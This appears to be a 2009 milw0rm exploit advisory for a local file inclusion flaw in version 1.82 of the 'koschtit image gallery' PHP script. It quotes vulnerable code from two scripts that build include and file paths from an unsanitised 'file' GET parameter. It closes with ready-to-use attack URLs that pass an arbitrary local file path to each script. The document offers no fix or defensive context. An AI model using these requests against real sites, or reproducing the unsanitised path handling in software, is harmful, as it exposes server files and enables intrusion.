@@ -1,0 +1,45 @@
+                            :local file include:
+   
+#############################
+script: koschtit_image_gallery(v1.82)
+   
+##############################################################
+download from:http://koschtit..tabere.net/download/
+or http://koschtit.tabere.net/en/#getit 
+   
+##############################################################
+vul:/ki_base/ki_makepic.php
+
+
+if(isset($_GET['file'])) 
+ $file = "../ki_galleries/".$_GET['file'];
+else
+ exit();
+
+$gallery = substr($_GET['file'], 0, strpos($_GET['file'], "/"));
+if(is_file("../ki_config/".$gallery."_ki_setup.php"))
+ include_once("../ki_config/".$gallery."_ki_setup.php");
+
+$imgsize = getimagesize($file); 
+
+#############
+vul:/ki_base/ki_nojsdisplayimage.php
+
+$gallery = substr($_GET['file'], 0, strpos($_GET['file'], "/"));
+
+include_once("../ki_config/ki_setup.php");
+if(is_file(".../ki_config/".$gallery."_ki_setup.php")){
+ include_once("../ki_config/".$gallery."_ki_setup.php");
+}
+.
+.
+$srcfile = "../ki_galleries/".$file;
+$imgsize = getimagesize("../ki_galleries/".$file);
+
+##############################################################
+xpl:
+path/ki_base/ki_makepic.php?file=[local_file]
+path/ki_base/ki_nojsdisplayimage.php?file=[local_file]  
+------------------------------------------------------------
+
+# milw0rm.com [2009-04-01]
